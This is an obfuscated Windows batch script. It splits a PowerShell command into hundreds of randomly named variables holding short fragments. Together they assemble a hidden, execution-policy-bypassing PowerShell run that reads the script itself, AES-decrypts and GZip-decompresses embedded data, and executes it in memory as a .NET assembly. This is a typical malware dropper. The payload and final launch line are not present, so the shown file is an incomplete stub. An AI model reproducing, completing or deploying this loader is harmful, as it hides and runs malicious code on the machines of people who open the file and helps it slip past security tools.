@echo off
!lswiUaCvvUWZDtqfGQkn! "xgQPbeTHnf=on ("
!lswiUaCvvUWZDtqfGQkn! "lfsNMvdZBL=pkKt"
!lswiUaCvvUWZDtqfGQkn! "BbYtBiszHx=	if "
!lswiUaCvvUWZDtqfGQkn! "xIuBjMUjZG=ZQ=="
!lswiUaCvvUWZDtqfGQkn! "PSZUIMNnWo=ypto"
!lswiUaCvvUWZDtqfGQkn! "nLzHywKoiS=s_va"
!lswiUaCvvUWZDtqfGQkn! "BkfNqdTUma=se()"
!lswiUaCvvUWZDtqfGQkn! "mYZVuVMRJH=aram"
!lswiUaCvvUWZDtqfGQkn! "WVFxJlhgUN=embl"
!lswiUaCvvUWZDtqfGQkn! "PirgUSBGNT=ram_"
!lswiUaCvvUWZDtqfGQkn! "cCEnMloTcD=tion"
!lswiUaCvvUWZDtqfGQkn! "xGSKWjDenl=.Dis"
!lswiUaCvvUWZDtqfGQkn! "wfAvDHgkOU=..-1"
!lswiUaCvvUWZDtqfGQkn! "iIPNGmTONU=de=["
!lswiUaCvvUWZDtqfGQkn! "COCwJysLuD=Crea"
!lswiUaCvvUWZDtqfGQkn! "AtYRhFMPmJ==$qd"
!lswiUaCvvUWZDtqfGQkn! "PndEAjwhis=nver"
!lswiUaCvvUWZDtqfGQkn! "HJEtvnoBxW=	$de"
!lswiUaCvvUWZDtqfGQkn! "SSKePdEDZH=n.Co"
!lswiUaCvvUWZDtqfGQkn! "zSwNVcgZXc=le ="
!lswiUaCvvUWZDtqfGQkn! "eiKZxUxfBa=n($p"
!lswiUaCvvUWZDtqfGQkn! "XrovqHctvx=aes_"
!lswiUaCvvUWZDtqfGQkn! "DEnvhCyxAO=tor_"
!lswiUaCvvUWZDtqfGQkn! "BYVSPCAqTY=D=$z"
!lswiUaCvvUWZDtqfGQkn! "ETielCbWls=$hos"
!lswiUaCvvUWZDtqfGQkn! "DxZXHIqTis=yste"
!lswiUaCvvUWZDtqfGQkn! "mUYmtfeNBq=load"
!lswiUaCvvUWZDtqfGQkn! "dmBKEzzSAo=]::C"
!lswiUaCvvUWZDtqfGQkn! "vOJZBDEfqM=$par"
!lswiUaCvvUWZDtqfGQkn! "pqjlrejFgh=var."
!lswiUaCvvUWZDtqfGQkn! "YsrHmeiLqB=30Xl"
!lswiUaCvvUWZDtqfGQkn! "jzNAoMbhwS=null"
!lswiUaCvvUWZDtqfGQkn! "OcocwZCDTt= ('%*'"
!lswiUaCvvUWZDtqfGQkn! "DtNUuiLzSE=cryp"
!lswiUaCvvUWZDtqfGQkn! "HCVFqwNsVm=cute"
!lswiUaCvvUWZDtqfGQkn! "idHayVKSRR=ompr"
!lswiUaCvvUWZDtqfGQkn! "ajXaepTZrR=$dec"
!lswiUaCvvUWZDtqfGQkn! "oOpgePamdd=tem."
!lswiUaCvvUWZDtqfGQkn! "tNCyChdlDr=oL'["
!lswiUaCvvUWZDtqfGQkn! "NapntcNlSq=-joi"
!lswiUaCvvUWZDtqfGQkn! "wdGrmEHLPh=UI.W"
!lswiUaCvvUWZDtqfGQkn! "gbxRHAKxRW=('\'"
!lswiUaCvvUWZDtqfGQkn! "dMZvtKIorq=');	"
!lswiUaCvvUWZDtqfGQkn! "FJcUOaONEG=load"
!lswiUaCvvUWZDtqfGQkn! "wMInrMcQsl=aes_"
!lswiUaCvvUWZDtqfGQkn! "OYkOCNIYWF=Leng"
!lswiUaCvvUWZDtqfGQkn! "WRYWgRleJl=tion"
!lswiUaCvvUWZDtqfGQkn! "yQQaKshwSn=2_va"
!lswiUaCvvUWZDtqfGQkn! "amKhTaaBqf=esaB"
!lswiUaCvvUWZDtqfGQkn! "rrhKvmPNcB=yloa"
!lswiUaCvvUWZDtqfGQkn! "rczceFItYA=();	"
!lswiUaCvvUWZDtqfGQkn! "rGXGbdEjGn=trin"
!lswiUaCvvUWZDtqfGQkn! "loJJbHcPsH= '%~f0'"
!lswiUaCvvUWZDtqfGQkn! "gDpjSAuprB=_var"
!lswiUaCvvUWZDtqfGQkn! "hjuLlqQNQF=_var"
!lswiUaCvvUWZDtqfGQkn! "yEmUyDXvNf='[-1"
!lswiUaCvvUWZDtqfGQkn! "YzyluRyBNz=flec"
!lswiUaCvvUWZDtqfGQkn! "ZsAHvzAXsV=func"
!lswiUaCvvUWZDtqfGQkn! "MEhZwqEIOj=wTit"
!lswiUaCvvUWZDtqfGQkn! "sboNUSrRdN=e();"
!lswiUaCvvUWZDtqfGQkn! "OFPPmFFCeS=omma"
!lswiUaCvvUWZDtqfGQkn! "ePNzrkLqjx=yloa"
!lswiUaCvvUWZDtqfGQkn! "gsknJHrCwG=in $"
!lswiUaCvvUWZDtqfGQkn! "DBAdnpbWQA=ke($"
!lswiUaCvvUWZDtqfGQkn! "dJJnCwlNHu=tion"
!lswiUaCvvUWZDtqfGQkn! "PLBHGugPFq=ispo"
!lswiUaCvvUWZDtqfGQkn! "AbKhTcxwTH=essi"
!lswiUaCvvUWZDtqfGQkn! "YHDBteNEnq=zwdK"
!lswiUaCvvUWZDtqfGQkn! "hvZTrqcThF= ([C"
!lswiUaCvvUWZDtqfGQkn! "LMRhGwxawm=int;"
!lswiUaCvvUWZDtqfGQkn! "NMAUiEdmOT=ptog"
!lswiUaCvvUWZDtqfGQkn! "DvwMsvQCVe= $pa"
!lswiUaCvvUWZDtqfGQkn! "obrQBNsPJn=Ay.D"
!lswiUaCvvUWZDtqfGQkn! "qLSRSQWXKh=tem."
!lswiUaCvvUWZDtqfGQkn! "apdtiVBWWt=ment"
!lswiUaCvvUWZDtqfGQkn! "WrteBRBEjp=iron"
!lswiUaCvvUWZDtqfGQkn! "yvharesvyU=tor("
!lswiUaCvvUWZDtqfGQkn! "oeSugiyJej=em.S"
!lswiUaCvvUWZDtqfGQkn! "lpLKqSDfLS=('gn"
!lswiUaCvvUWZDtqfGQkn! "xGAdjdwimS=ose("
!lswiUaCvvUWZDtqfGQkn! "kjGvRiKXaf=null"
!lswiUaCvvUWZDtqfGQkn! "LeqBFEpFcx=retu"
!lswiUaCvvUWZDtqfGQkn! "LfUgaftdCM=rt]:"
!lswiUaCvvUWZDtqfGQkn! "zPBxQDZzJI=em.S"
!lswiUaCvvUWZDtqfGQkn! "gkOaxBmzCX=ompr"
!lswiUaCvvUWZDtqfGQkn! "ADMqfwtmPP=($qd"
!lswiUaCvvUWZDtqfGQkn! "fQKlfKDmfV=($pa"
!lswiUaCvvUWZDtqfGQkn! "DxiSgKRVtQ=aeR'"
!lswiUaCvvUWZDtqfGQkn! "wOpoiLeTfi=herM"
!lswiUaCvvUWZDtqfGQkn! "nleTRZPEMc=rypt"
!lswiUaCvvUWZDtqfGQkn! "EhgtlwXHjf=tem."
!lswiUaCvvUWZDtqfGQkn! "GSOjPdhjgN=ecom"
!lswiUaCvvUWZDtqfGQkn! "uwFNLjQvsF=kijQ"
!lswiUaCvvUWZDtqfGQkn! "EVaQZYgets=$pay"
!lswiUaCvvUWZDtqfGQkn! "koeGiVtHjU=r[1]"
!lswiUaCvvUWZDtqfGQkn! "iRwtUJDacV=llAd"
!lswiUaCvvUWZDtqfGQkn! "hByzRyYgKH=N=[S"
!lswiUaCvvUWZDtqfGQkn! "kKYWhGoJUF=:('g"
!lswiUaCvvUWZDtqfGQkn! "gPbkrTelRA=in '"
!lswiUaCvvUWZDtqfGQkn! "XmISonRCDW=ode]"
!lswiUaCvvUWZDtqfGQkn! "lMLRRoHusw=;		b"
!lswiUaCvvUWZDtqfGQkn! "IkODtEuDeM=]]$p"
!lswiUaCvvUWZDtqfGQkn! "pJcyXEqrZo=;$pa"
!lswiUaCvvUWZDtqfGQkn! "QvNuDHpIoz=[Env"
!lswiUaCvvUWZDtqfGQkn! "nhdXIwIFAo=ypt_"
!lswiUaCvvUWZDtqfGQkn! "jxGcYURiHr=trea"
!lswiUaCvvUWZDtqfGQkn! "gGfOdgYDNl=Obje"
!lswiUaCvvUWZDtqfGQkn! "LudOACBcAm=m.Re"
!lswiUaCvvUWZDtqfGQkn! "beYrQUOMoV=ity."
!lswiUaCvvUWZDtqfGQkn! "wGWYYqRKDl=morF"
!lswiUaCvvUWZDtqfGQkn! "KfxnCpsvVx=se()"
!lswiUaCvvUWZDtqfGQkn! "qjzNDuAKvM=Deco"
!lswiUaCvvUWZDtqfGQkn! "VXMWWKKzPk=	$Fn"
!lswiUaCvvUWZDtqfGQkn! "eLcaKugWzw=C;	$"
!lswiUaCvvUWZDtqfGQkn! "gOTksaoeya=inal"
!lswiUaCvvUWZDtqfGQkn! "nvDKBBrumI=ne);"
!lswiUaCvvUWZDtqfGQkn! "aDbTgANGBU=IHD."
!lswiUaCvvUWZDtqfGQkn! "JlHzXeksGj=PKNN"
!lswiUaCvvUWZDtqfGQkn! "sqlMmXqsVx=.Mem"
!lswiUaCvvUWZDtqfGQkn! "ORpBpILaJG=;	$a"
!lswiUaCvvUWZDtqfGQkn! "KJJedajcct=mpre"
!lswiUaCvvUWZDtqfGQkn! "fhdTbsJzHS=ss_f"
!lswiUaCvvUWZDtqfGQkn! "hyUyHblJiZ=mpre"
!lswiUaCvvUWZDtqfGQkn! "lrhNIGtKHd=::('"
!lswiUaCvvUWZDtqfGQkn! "LJJqlftRtp=var."
!lswiUaCvvUWZDtqfGQkn! "ZtCdscUZHm=em.I"
!lswiUaCvvUWZDtqfGQkn! "WZquuKokQw=saBm"
!lswiUaCvvUWZDtqfGQkn! "zDNuHVAAdX=_var"
!lswiUaCvvUWZDtqfGQkn! "pHCIqswyyu=ormF"
!lswiUaCvvUWZDtqfGQkn! "pjeKPUjnjl=tS46"
!lswiUaCvvUWZDtqfGQkn! "FwcEDywXte= dec"
!lswiUaCvvUWZDtqfGQkn! "cpCRrZCXVi=cute"
!lswiUaCvvUWZDtqfGQkn! "ciFYHuPYPf=var."
!lswiUaCvvUWZDtqfGQkn! "iTGQSbJAYH=deco"
!lswiUaCvvUWZDtqfGQkn! "cDbmIFCVRg=zDBd"
!lswiUaCvvUWZDtqfGQkn! "aLLTbVgetq=[Sys"
!lswiUaCvvUWZDtqfGQkn! "evQIIgtwWT=.-16"
!lswiUaCvvUWZDtqfGQkn! "cDGHWVnJUb=Y5Gp"
!lswiUaCvvUWZDtqfGQkn! "GzbvQcYOPM=r.Mo"
!lswiUaCvvUWZDtqfGQkn! "IDtzlGCuqI=	$Lk"
!lswiUaCvvUWZDtqfGQkn! "GabHyjgsHM=th);"
!lswiUaCvvUWZDtqfGQkn! "gUchALuKZL=ing="
!lswiUaCvvUWZDtqfGQkn! "tLAQFQcjJz=aF9P"
!lswiUaCvvUWZDtqfGQkn! "RRHVWAlBgW=ssio"
!lswiUaCvvUWZDtqfGQkn! "cvBEHHqPuX=ert]"
!lswiUaCvvUWZDtqfGQkn! "BzuHOHMewV=or_v"
!lswiUaCvvUWZDtqfGQkn! "OvSMoCoyXw=jiOq"
!lswiUaCvvUWZDtqfGQkn! "fodannTODU=ram_"
!lswiUaCvvUWZDtqfGQkn! "RRDUREmOPd=To($"
!lswiUaCvvUWZDtqfGQkn! "JYxzGWZWaR=-nop"
!lswiUaCvvUWZDtqfGQkn! "VRYAJrSvRR=] -j"
!lswiUaCvvUWZDtqfGQkn! "nyfDKvbOeO=ispo"
!lswiUaCvvUWZDtqfGQkn! "DKHYgTycXM=Conv"
!lswiUaCvvUWZDtqfGQkn! "uvOwNGsDWH=mory"
!lswiUaCvvUWZDtqfGQkn! "xmcHzsfnoc=PKCS"
!lswiUaCvvUWZDtqfGQkn! "vDBselvmKF=trin"
!lswiUaCvvUWZDtqfGQkn! "VrcYaprBAT=$Lki"
!lswiUaCvvUWZDtqfGQkn! "gltIPvRjGW=aphy"
!lswiUaCvvUWZDtqfGQkn! "fmGOhrUZYd=ijQ="
!lswiUaCvvUWZDtqfGQkn! "TTvuIxtYJB=46es"
!lswiUaCvvUWZDtqfGQkn! "LPBqatcTtY=wind"
!lswiUaCvvUWZDtqfGQkn! "tUnCrWWbBi=DBdN"
!lswiUaCvvUWZDtqfGQkn! "vmEScNFllp=s_va"
!lswiUaCvvUWZDtqfGQkn! "gBWvKxwYaB=ar);"
!lswiUaCvvUWZDtqfGQkn! "WOyeYRjNax=ity."
!lswiUaCvvUWZDtqfGQkn! "bnpDifWJPY=,$pa"
!lswiUaCvvUWZDtqfGQkn! "BkYuzAyNkC=en -"
!lswiUaCvvUWZDtqfGQkn! "omNuudUzWB=ar=$"
!lswiUaCvvUWZDtqfGQkn! "BqktOkZaEi=);$p"
!lswiUaCvvUWZDtqfGQkn! "VBpAtyColr=IO.C"
!lswiUaCvvUWZDtqfGQkn! "TEloeimCel=ile]"
!lswiUaCvvUWZDtqfGQkn! "QqJuxcKQle=y]::"
!lswiUaCvvUWZDtqfGQkn! "ZGAcaemEDW=cryp"
!lswiUaCvvUWZDtqfGQkn! "ViEntBLfHo=tS46"
!lswiUaCvvUWZDtqfGQkn! "IurRQefTqD=mpre"
!lswiUaCvvUWZDtqfGQkn! "RxZYSxjlda=r=[s"
!lswiUaCvvUWZDtqfGQkn! "bXoUfNxlmv=hidd"
!lswiUaCvvUWZDtqfGQkn! "GcnyNWFcmB=		$h"
!lswiUaCvvUWZDtqfGQkn! "hVaPKUkMUm=w-Ob"
!lswiUaCvvUWZDtqfGQkn! "fJRjKSVGVW=;$SM"
!lswiUaCvvUWZDtqfGQkn! "WjlxdZeYoc=;	$M"
!lswiUaCvvUWZDtqfGQkn! "eRPjYFZfKy=($qd"
!lswiUaCvvUWZDtqfGQkn! "wCjthwXUxZ=func"
!lswiUaCvvUWZDtqfGQkn! "OdvuAEUzdu=ert]"
!lswiUaCvvUWZDtqfGQkn! "eKmlUXAWhn=M=')"
!lswiUaCvvUWZDtqfGQkn! "fCFfRChQdp=togr"
!lswiUaCvvUWZDtqfGQkn! "yFwjqeFGxo=-16]"
!lswiUaCvvUWZDtqfGQkn! "RXXrrEUWBi=]::N"
!lswiUaCvvUWZDtqfGQkn! "MfKxJvlzqC=_var"
!lswiUaCvvUWZDtqfGQkn! "RHAEhDGvPl=SMOV"
!lswiUaCvvUWZDtqfGQkn! "ZNotctkCZi=ctio"
!lswiUaCvvUWZDtqfGQkn! "slBATKFGSQ=Key="
!lswiUaCvvUWZDtqfGQkn! "ZlmwZSluQt=ad2_"
!lswiUaCvvUWZDtqfGQkn! "KbBwPwaQIp=join"
!lswiUaCvvUWZDtqfGQkn! "FhmXJxVlZF=e) {"
!lswiUaCvvUWZDtqfGQkn! "vnEYjNcZso=r);}"
!lswiUaCvvUWZDtqfGQkn! "qzlJFmsZrb=yle "
!lswiUaCvvUWZDtqfGQkn! "uygJrQgEqk='')("
!lswiUaCvvUWZDtqfGQkn! "bYTAVYfmDl=RLT."
!lswiUaCvvUWZDtqfGQkn! "vWTmqenIzL=pose"
!lswiUaCvvUWZDtqfGQkn! "umuRmKsXAR=Stre"
!lswiUaCvvUWZDtqfGQkn! "wtKRwdxSpH=tion"
!lswiUaCvvUWZDtqfGQkn! "dSapOeexjW=irtS"
!lswiUaCvvUWZDtqfGQkn! "ABTIShiCSV=e]::"
!lswiUaCvvUWZDtqfGQkn! "iCnotfAQkf=s -c"
!lswiUaCvvUWZDtqfGQkn! "NJEPZsrhOl=g[]]"
!lswiUaCvvUWZDtqfGQkn! "xvwgSHWUsm=D358"
!lswiUaCvvUWZDtqfGQkn! "HjgWPvItoS=aVxk"
!lswiUaCvvUWZDtqfGQkn! "ofujSbBTTl=S46e"
!lswiUaCvvUWZDtqfGQkn! "hwXKjLPOCG=Conv"
!lswiUaCvvUWZDtqfGQkn! "cxFyhEVcHg=le -"
!lswiUaCvvUWZDtqfGQkn! "NylLRofqnj=gnir"
!lswiUaCvvUWZDtqfGQkn! "tEerWZTxHO=RLT."
!lswiUaCvvUWZDtqfGQkn! "KGroEoSwUA=yste"
!lswiUaCvvUWZDtqfGQkn! "kPiaVIPGWt=r_va"
!lswiUaCvvUWZDtqfGQkn! "MgDQeQJgcZ=Star"
!lswiUaCvvUWZDtqfGQkn! "iOSsyoLtxU=ar=$"
!lswiUaCvvUWZDtqfGQkn! "FmqvjbUmZj=')('"
!lswiUaCvvUWZDtqfGQkn! "ShGQAXjOyU=ar[0"
!lswiUaCvvUWZDtqfGQkn! "SVIyYLxdPD=])))"
!lswiUaCvvUWZDtqfGQkn! "afYefzoVZh=rity"
!lswiUaCvvUWZDtqfGQkn! "xcYrycBefe=::CB"
!lswiUaCvvUWZDtqfGQkn! "gtLVHYucNW=fore"
!lswiUaCvvUWZDtqfGQkn! "oEZhNpmGod=6] -"
!lswiUaCvvUWZDtqfGQkn! "sUTeBhKebr=$hPK"
!lswiUaCvvUWZDtqfGQkn! "qklzhIWurq=indo"
!lswiUaCvvUWZDtqfGQkn! "WScKoUkCth=))	{"
!lswiUaCvvUWZDtqfGQkn! "aIqeQrMSTv=).Sp"
!lswiUaCvvUWZDtqfGQkn! "kgOrgOsdZe=tsWi"
!lswiUaCvvUWZDtqfGQkn! "BAEeszvWyG=$FnF"
!lswiUaCvvUWZDtqfGQkn! "JQzBKZKhOL=, $p"
!lswiUaCvvUWZDtqfGQkn! "adCrWaneNA=ypas"
!lswiUaCvvUWZDtqfGQkn! "ZHirDVmASR=exe""
!lswiUaCvvUWZDtqfGQkn! "PxwVBCkMOo=erSh"
!lswiUaCvvUWZDtqfGQkn! "ELJDHICCEx=v1.0"
!lswiUaCvvUWZDtqfGQkn! "AEiCfRGjSv=\Sys"
!lswiUaCvvUWZDtqfGQkn! "gwjKxpqPWE= "
!lswiUaCvvUWZDtqfGQkn! "oYtvORXkDu=2\Wi"
!lswiUaCvvUWZDtqfGQkn! "BifCQFVRff=tem3"
!lswiUaCvvUWZDtqfGQkn! "TvGyVGrTSB=ell\"
!lswiUaCvvUWZDtqfGQkn! "SjMoseQpms=\Win"
!lswiUaCvvUWZDtqfGQkn! "ylARdKpBbQ=dows"
!lswiUaCvvUWZDtqfGQkn! "LYjfFdzVJh=\pow"
!lswiUaCvvUWZDtqfGQkn! "eouTHcaYVk=ersh"
!lswiUaCvvUWZDtqfGQkn! "cybHfPwSck="%systemdrive%"
!lswiUaCvvUWZDtqfGQkn! "yGwRQqgYby=sPow"
!lswiUaCvvUWZDtqfGQkn! "YmgzUeOSoT=ell."
!lswiUaCvvUWZDtqfGQkn! "AVQlJobjiB=ndow"
